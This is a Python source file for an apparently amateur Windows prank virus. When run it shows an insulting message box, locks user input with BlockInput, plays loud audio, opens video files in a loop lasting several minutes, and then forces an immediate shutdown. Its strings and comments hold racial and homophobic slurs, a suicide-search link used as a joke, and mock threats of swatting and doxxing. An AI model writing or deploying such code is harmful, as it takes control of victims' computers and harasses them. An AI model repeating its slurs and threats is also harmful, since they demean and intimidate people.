# Importing all the shit I need
from ctypes import *
import os
import time
import pythoncom
import pygame
from os import startfile

# TODO: These are for cut payloads, that I will implement later
# import random
# import webbrowser
# import win32api
# import win32con
# import win32gui

# Timer
times = 0

# Array for links in the browser payload
search_terms = ["https://www.google.com/search?q=gay+nibbas+kissing&rlz=1C1VDKB_enNZ982NZ982&sxsrf=ALiCzsYA4lCx7iN20yv-3BqV3Yf0mnB0LA:1654233627499&source=lnms&tbm=isch&sa=X&ved=2ahUKEwj7_fe9xJD4AhWUwjgGHcgmCJkQ_AUoAXoECAEQAw&cshid=1654233634285208&biw=1920&bih=937&dpr=1",
                "https://www.google.com/search?q=where+to+buy+weed&rlz=1C1VDKB_enNZ982NZ982&sxsrf=ALiCzsa3eo55vx416qqFbUlKCFONjMv6Ww:1654233359616&source=lnms&tbm=shop&sa=X&ved=2ahUKEwij3Jm-w5D4AhUv8DgGHS0cDwEQ_AUoAXoECAIQAw&biw=1920&bih=937&dpr=1",
                "https://www.google.com/search?q=how+to+get+laid!1!!11!!&rlz=1C1VDKB_enNZ982NZ982&oq=how+to+get+laid!1!!11!!&aqs=chrome..69i57j33i160l4.12192j0j7&sourceid=chrome&ie=UTF-8",
                "https://www.google.com/search?q=gay+nibbas+kissing&rlz=1C1VDKB_enNZ982NZ982&sxsrf=ALiCzsYA4lCx7iN20yv-3BqV3Yf0mnB0LA:1654233627499&source=lnms&tbm=isch&sa=X&ved=2ahUKEwj7_fe9xJD4AhWUwjgGHcgmCJkQ_AUoAXoECAEQAw&cshid=1654233634285208&biw=1920&bih=937&dpr=1",
                "https://www.google.com/search?q=I+want+to+kill+myself&rlz=1C1VDKB_enNZ982NZ982&oq=I+want+to+kill+myself&aqs=chrome..69i57.5504j0j7&sourceid=chrome&ie=UTF-8",
                "https://www.google.com/search?q=l+%2B+bozo+meaning&rlz=1C1VDKB_enNZ982NZ982&oq=L+%2B+bozo+meaning&aqs=chrome.0.0i512j0i22i30l2j0i390l4.5024j0j7&sourceid=chrome&ie=UTF-8",
                "https://www.google.com/search?q=gay+nibbas+kissing&rlz=1C1VDKB_enNZ982NZ982&sxsrf=ALiCzsYA4lCx7iN20yv-3BqV3Yf0mnB0LA:1654233627499&source=lnms&tbm=isch&sa=X&ved=2ahUKEwj7_fe9xJD4AhWUwjgGHcgmCJkQ_AUoAXoECAEQAw&cshid=1654233634285208&biw=1920&bih=937&dpr=1"]

# TODO: Figure out a good way to implement msg boxes as a payload
msg_terms = ["Still using this computer lol", "imagine running a sus exe file lmao", "stealing credit card infomation...", "doxxing your house", "sending a swat team to your area",
             "Are you still watching your gay porn", "Imagine being a fucking idiot", "I've seen you jacking off to catgirls, your going to helll"]

# Message box alerting user that virus has been executed
MessageBox = windll.user32.MessageBoxW
MessageBox(None, 'Your computer just got fucked in the ass L. Hope you like black guys twerking 💀', 'L + Get Fucked Bozo', 0)

# All user input is lock, stops interference
input_lock = windll.user32.BlockInput(True)

# Another payload that simply changes the wallpaper
#def wallpaper(path):
#    key = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER,"Control Panel\\Desktop",0,win32con.KEY_SET_VALUE)
#   win32api.RegSetValueEx(key, "WallpaperStyle", 0, win32con.REG_SZ, "0")
#    win32api.RegSetValueEx(key, "TileWallpaper", 0, win32con.REG_SZ, "0")
#    win32gui.SystemParametersInfo(win32con.SPI_SETDESKWALLPAPER, path, 1+2)

# TODO: Make a dynamic directory link, cause we need that compatibility
# wallpaper('C:\\Users\\GLUR\\PycharmProjects\\firstscript\\L.png')

# Play earrape music in victims ears LMAO
pygame.mixer.init()
pygame.mixer.music.load('deez.mp3')
pygame.mixer.music.play(5)

# Check how long payload has run, cause python timers are bullshit
while times <= 10:
    # Black guy twerking payload
    startfile("deez.mov")
    time.sleep(8)
    startfile("deez1.mov")
    time.sleep(8)
    startfile("deez2.mov")
    time.sleep(33)
    startfile("deez3.mov")
    time.sleep(2)
    startfile("deez4.mov")
    time.sleep(13)

    # Timer stuff
    times = times + 1
    # TODO: Find a good way to implement searches payload
    # webbrowser.get('C:/Program Files/Google/Chrome/Application/chrome.exe %s').open_new_tab(random.choice(search_terms))
    # time.sleep(random.choice(range(3, 4)))

# After payloads have finished the computer will to L
os.system("shutdown /s /t 1")